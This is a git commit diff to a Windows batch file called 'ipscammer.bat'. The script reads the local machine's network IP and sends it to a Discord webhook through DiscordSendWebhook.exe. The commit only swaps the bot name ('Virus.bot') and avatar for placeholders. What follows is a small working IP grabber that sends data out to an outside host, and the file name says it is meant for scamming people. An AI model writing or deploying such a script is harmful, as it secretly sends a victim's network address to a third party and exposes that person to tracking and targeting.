9d2324e6d75383a7521e417b29532aeaec94de57
Lominub44 <145709216+Lominub44@users.noreply.github.com>
2023-12-29 12:29:29 +0100

    Update ipscammer.bat

--- ipscammer.bat
+++ ipscammer.bat
@@ -1,5 +1,5 @@
 for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a
 echo Network IP: %NetworkIP%
 @echo off
-DiscordSendWebhook.exe -m %NetworkIP% -n "Virus.bot" -a http://www.phoenix125.com/share/phoenix.png -w "your discord webhook url"
+DiscordSendWebhook.exe -m %NetworkIP% -n "your webhooks name" -a "your webhooks profile picture" -w "your discord webhook url"
 pause
